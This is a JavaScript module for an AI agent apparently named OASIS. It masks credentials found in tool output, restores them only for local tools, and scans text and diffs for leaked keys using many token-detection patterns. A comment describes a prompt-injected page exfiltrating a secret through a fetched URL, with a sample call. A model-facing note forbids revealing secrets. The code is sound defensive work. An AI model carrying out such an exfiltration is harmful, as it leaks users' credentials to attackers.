// Secret shield: keeps high-confidence credentials out of model requests and
// saved transcripts. Tool results are scanned before they enter the
// conversation; each secret is replaced with a stable placeholder such as
// «secret:3f9a1c2b». The real value is kept only in memory for this session,
// and placeholders in later tool arguments are swapped back to the real value
// right before execution, so the agent can still edit a .env file or pass a
// token to a command without the value ever reaching the provider.
//
// Disable with secretShield:false in settings or OASIS_SECRET_SHIELD=0.

import { createHash } from 'node:crypto';
import { findRuleSecrets } from './secret-rules.mjs';

// Detection has two tiers: Gitleaks' maintained rule set (220 provider-specific
// rules with keyword prefilters, entropy thresholds and allowlists; see
// src/secret-rules.mjs) and the prefix-anchored patterns below, which also
// catch formats Gitleaks pins to exact lengths or markers.
const TOKEN_PATTERNS = [
  /\bsk-ant-[A-Za-z0-9_-]{20,}/g,
  /\bsk-proj-[A-Za-z0-9_-]{20,}/g,
  /\bsk-(?:live|test)_[A-Za-z0-9]{16,}/g,
  /\b(?:sk|rk)_(?:live|test)_[A-Za-z0-9]{16,}/g,
  /\b(?:rk|pk)_live_[A-Za-z0-9]{16,}/g,
  /\bsk-[A-Za-z0-9]{32,}\b/g,
  /\bgh[pousr]_[A-Za-z0-9]{30,}\b/g,
  /\bgithub_pat_[A-Za-z0-9_]{40,}\b/g,
  /\bglpat-[A-Za-z0-9_-]{20,}\b/g,
  /\bxox[abprs]-[A-Za-z0-9-]{20,}\b/g,
  /\bAKIA[0-9A-Z]{16}\b/g,
  /\bAIza[0-9A-Za-z_-]{35}\b/g,
  /\bhf_[A-Za-z0-9]{30,}\b/g,
  /\bnpm_[A-Za-z0-9]{36}\b/g,
  /\bSG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}\b/g,
  /\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b/g,
  /\bsk-or-v1-[A-Za-z0-9]{40,}\b/g,
  /\bsk-ant-admin[0-9]{2}-[A-Za-z0-9_-]{20,}/g,
  /\bgsk_[A-Za-z0-9]{40,}\b/g,
  /\bxai-[A-Za-z0-9]{40,}\b/g,
  /\bpplx-[A-Za-z0-9]{40,}\b/g,
  /\br8_[A-Za-z0-9]{30,}\b/g,
  /\bya29\.[A-Za-z0-9_-]{40,}/g,
  /\bGOCSPX-[A-Za-z0-9_-]{24,}/g,
  /\bpypi-AgEIcHlwaS5vcmc[A-Za-z0-9_-]{40,}/g,
  /\bdop_v1_[a-f0-9]{64}\b/g,
  /\bshp(?:at|ca|pa|ss)_[a-fA-F0-9]{32}\b/g,
  /\blin_api_[A-Za-z0-9]{40}\b/g,
  /\bdp\.(?:st|ct|sa|scim)\.[A-Za-z0-9_-]{40,}\b/g,
  /\bwhsec_[A-Za-z0-9]{24,}\b/g,
  /\bglc?(?:dt|ptt|rt|soat)-[A-Za-z0-9_-]{20,}\b/g,
  /\bSK[0-9a-fA-F]{32}\b/g,
  /\b[0-9]{8,10}:AA[A-Za-z0-9_-]{33}\b/g,
  /https:\/\/hooks\.slack\.com\/services\/T[A-Z0-9]+\/B[A-Z0-9]+\/[A-Za-z0-9]{20,}/g,
  /https:\/\/(?:ptb\.|canary\.)?discord(?:app)?\.com\/api\/webhooks\/[0-9]{15,}\/[A-Za-z0-9_-]{50,}/g,
  /\bAccountKey=[A-Za-z0-9+\/]{80,}={0,2}/g,
  /-----BEGIN (?:[A-Z]+ )?PRIVATE KEY-----[\s\S]+?-----END (?:[A-Z]+ )?PRIVATE KEY-----/g
];

// Secret spans from both tiers, sorted and merged.
function tokenSpans(text) {
  const spans = findRuleSecrets(text).map((hit) => ({ start: hit.start, end: hit.end, rule: hit.rule }));
  for (const pattern of TOKEN_PATTERNS) {
    for (const match of text.matchAll(pattern)) spans.push({ start: match.index, end: match.index + match[0].length, rule: '' });
  }
  spans.sort((a, b) => a.start - b.start || b.end - a.end);
  const merged = [];
  for (const span of spans) {
    const last = merged[merged.length - 1];
    if (last && span.start < last.end) { if (span.end > last.end) last.end = span.end; if (!last.rule) last.rule = span.rule; continue; }
    merged.push({ ...span });
  }
  return merged;
}

function replaceSpans(text, spans, replace) {
  if (!spans.length) return text;
  let out = '';
  let at = 0;
  for (const span of spans) { out += text.slice(at, span.start) + replace(text.slice(span.start, span.end)); at = span.end; }
  return out + text.slice(at);
}

// KEY=value lines (dotenv, shell exports, ini, yaml) whose key names a secret.
const ASSIGNMENT = /^(\s*(?:export\s+)?["']?(?:[A-Za-z][A-Za-z0-9_.-]*)?(?:SECRET|TOKEN|PASSWORD|PASSWD|PWD|API_?KEY|ACCESS_?KEY|PRIVATE_?KEY|CLIENT_?SECRET|AUTH|CREDENTIALS?|DSN|DATABASE_URL|CONNECTION_STRING)[A-Za-z0-9_.-]*["']?[ \t]*[:=][ \t]*["']?)([^"'\s#][^"'\s]{7,})(["']?[ \t]*(?:#.*)?)$/gim;
// URLs with embedded credentials: scheme://user:password@host
const URL_CREDENTIAL = /\b([a-z][a-z0-9+.-]*:\/\/[^\s:/@]+:)([^\s@/]{4,})(@)/gi;
const PLACEHOLDER = /«secret:([0-9a-f]{8})»/g;
// Authorization headers can carry opaque credentials that do not match provider-token prefixes.
const AUTH_HEADER = /\b((?:authorization|proxy-authorization)\s*[:=]\s*["']?\s*(?:Bearer|Basic)\s+)([^"'\s,;]{8,})/gi;
const NON_SECRET_VALUE = /^(?:\$\{?[A-Za-z_]|process\.env|os\.environ|env\(|getenv|<[^>]+>|\[redacted|«secret:|x{6,}|\*{4,}|changeme$|your[_-]|example|placeholder|dummy|test$|true$|false$|null$|none$|undefined$)/i;

export function secretShieldEnabled(session, env = process.env) {
  if (/^(0|false|off|no)$/i.test(String(env.OASIS_SECRET_SHIELD || ''))) return false;
  return !(session && session.config && session.config.secretShield === false);
}

function vaultOf(session) {
  if (!(session.secretVault instanceof Map)) {
    Object.defineProperty(session, 'secretVault', { value: new Map(), writable: true, configurable: true, enumerable: false });
  }
  return session.secretVault;
}

function placeholderFor(session, secret) {
  const id = createHash('sha256').update(secret).digest('hex').slice(0, 8);
  vaultOf(session).set(id, secret);
  return '«secret:' + id + '»';
}

/** Replace secrets in text with session placeholders. Returns { text, count }. */
export function maskSecrets(session, text) {
  if (typeof text !== 'string' || !text) return { text, count: 0 };
  let count = 0;
  const swap = (secret) => { count++; return placeholderFor(session, secret); };
  let output = replaceSpans(text, tokenSpans(text), swap);
  output = output.replace(ASSIGNMENT, (whole, head, value, tail) => (NON_SECRET_VALUE.test(value) || /^[\d.]+$/.test(value) ? whole : head + swap(value) + tail));
  output = output.replace(URL_CREDENTIAL, (whole, head, password, at) => (NON_SECRET_VALUE.test(password) ? whole : head + swap(password) + at));
  output = output.replace(AUTH_HEADER, (whole, prefix, credential) => prefix + swap(credential));
  return { text: output, count };
}

/**
 * Replace the credentials the shield recognises with "[redacted]" (no vault).
 * Used for everything written to disk or shared (debug logs, trajectories,
 * session previews, memories, artifacts, approval text) so those redactors
 * do not fall behind the shield's list.
 */
export function redactSecretText(text, { token = '[redacted]' } = {}) {
  if (typeof text !== 'string' || !text) return text;
  let output = replaceSpans(text, tokenSpans(text), () => token);
  output = output.replace(ASSIGNMENT, (whole, head, value, tail) => (NON_SECRET_VALUE.test(value) || /^[\d.]+$/.test(value) ? whole : head + '[redacted]' + tail));
  output = output.replace(URL_CREDENTIAL, (whole, head, password, at) => (NON_SECRET_VALUE.test(password) ? whole : head + '[redacted]' + at));
  output = output.replace(AUTH_HEADER, (whole, prefix) => prefix + '[redacted]');
  return output;
}

/** redactSecretText() on every string inside a value (before it is serialized). */
export function redactSecretValues(value, depth = 0) {
  if (typeof value === 'string') return redactSecretText(value);
  if (depth > 20 || !value || typeof value !== 'object') return value;
  if (Array.isArray(value)) return value.map((item) => redactSecretValues(item, depth + 1));
  return Object.fromEntries(Object.entries(value).map(([key, entry]) => [key, redactSecretValues(entry, depth + 1)]));
}

/** Swap placeholders back to real values inside tool arguments (deep). */
export function unmaskSecrets(session, value) {
  const vault = session && session.secretVault instanceof Map ? session.secretVault : null;
  if (!vault || !vault.size) return value;
  const visit = (item) => {
    if (typeof item === 'string') return item.includes('«secret:') ? item.replace(PLACEHOLDER, (whole, id) => (vault.has(id) ? vault.get(id) : whole)) : item;
    if (Array.isArray(item)) return item.map(visit);
    if (item && typeof item === 'object') return Object.fromEntries(Object.entries(item).map(([key, entry]) => [key, visit(entry)]));
    return item;
  };
  return visit(value);
}

// Tools whose arguments go straight to a third-party host. A real secret has no
// business in a fetched URL or a search query, and swapping it in there would
// let a prompt-injected page exfiltrate it (fetch https://site/?k=«secret:ID»)
// from a host the user already approved, with no further prompt.
// Tools that hand text to another model (subagents, teammates, the advisor)
// keep placeholders too; the child shares the vault, so its own tool calls
// still receive the real value.
const NO_UNMASK_TOOLS = new Set(['fetch_url', 'web_search', 'browser', 'task', 'send_message', 'team_send_message', 'team_create', 'workflow', 'advisor', 'run_specialist_review']);

/** Lets a subagent resolve the parent's placeholders without seeing the values. */
export function shareSecretVault(parent, child) {
  if (!parent || !child) return;
  Object.defineProperty(child, 'secretVault', { value: vaultOf(parent), writable: true, configurable: true, enumerable: false });
}

/** unmaskSecrets() for one tool call; network-read and agent-message tools keep the placeholders. */
export function unmaskSecretsForTool(session, toolName, value) {
  return NO_UNMASK_TOOLS.has(String(toolName || '')) ? value : unmaskSecrets(session, value);
}

export const SECRET_SHIELD_NOTE = 'Values shown as «secret:ID» are credentials hidden from you by OASIS. Use the placeholder verbatim in tool arguments ' +
  '(edits, commands) and OASIS substitutes the real value; never ask the user to paste secrets and never try to reveal them.';

// Finds high-confidence credentials in text (e.g. added diff lines). Returns
// [{ kind, preview }] with values masked; obvious samples ("EXAMPLE", xxxx) are skipped.
const SAMPLE_VALUE = /example|sample|dummy|placeholder|fake|x{5,}|\*{4,}|0{8,}|1234567890|abcdef(?:ghij)?$|your[_-]?(?:api|key|token)|«secret:/i;
const maskPreview = (value) => { const text = String(value); return text.length <= 8 ? '****' : text.slice(0, 4) + '…' + text.slice(-2) + ' (' + text.length + ' chars)'; };
export function findSecretsInText(text) {
  const found = [];
  const value = String(text || '');
  for (const span of tokenSpans(value)) {
    const secret = value.slice(span.start, span.end);
    if (SAMPLE_VALUE.test(secret)) continue;
    const privateKey = /PRIVATE KEY/.test(secret) || /private-key/.test(span.rule);
    found.push({ kind: privateKey ? 'private key' : 'token', ...(span.rule ? { rule: span.rule } : {}), preview: maskPreview(secret.split('\n')[0]) });
  }
  for (const match of value.matchAll(new RegExp(ASSIGNMENT.source, ASSIGNMENT.flags))) {
    const secret = match[2];
    if (NON_SECRET_VALUE.test(secret) || SAMPLE_VALUE.test(secret) || /^[a-z]+$/i.test(secret) || /^\$|^\{\{|^%\(|^@/.test(secret)) continue;
    found.push({ kind: 'assignment ' + match[1].trim().replace(/\s*[:=]\s*["']?$/, ''), preview: maskPreview(secret) });
  }
  for (const match of value.matchAll(new RegExp(URL_CREDENTIAL.source, URL_CREDENTIAL.flags))) {
    if (SAMPLE_VALUE.test(match[2]) || /^\$|^\{/.test(match[2])) continue;
    found.push({ kind: 'URL credential', preview: match[1] + '****@' });
  }
  return found;
}

// Scans a unified diff and reports secrets on added lines as file:line.
export function findSecretsInDiff(diff) {
  const hits = [];
  let file = '';
  let line = 0;
  const lines = String(diff || '').split('\n');
  // Private keys span lines; check whole added blocks per file as well.
  let block = [];
  const flush = () => {
    if (!block.length) return;
    const joined = block.map((item) => item.text).join('\n');
    if (/-----BEGIN (?:[A-Z]+ )?PRIVATE KEY-----/.test(joined)) {
      for (const hit of findSecretsInText(joined)) if (hit.kind === 'private key') hits.push({ file, line: block[0].line, ...hit });
    }
    block = [];
  };
  for (const raw of lines) {
    if (raw.startsWith('+++ ')) { flush(); file = raw.replace(/^\+\+\+ (?:b\/)?/, ''); continue; }
    const header = raw.match(/^@@ -\d+(?:,\d+)? \+(\d+)(?:,\d+)? @@/);
    if (header) { flush(); line = Number(header[1]); continue; }
    if (raw.startsWith('+') && !raw.startsWith('+++')) {
      const text = raw.slice(1);
      block.push({ text, line });
      for (const hit of findSecretsInText(text)) if (hit.kind !== 'private key') hits.push({ file, line, ...hit });
      line++;
    } else if (!raw.startsWith('-')) { flush(); if (!raw.startsWith('\\')) line++; }
  }
  flush();
  return hits.slice(0, 50);
}
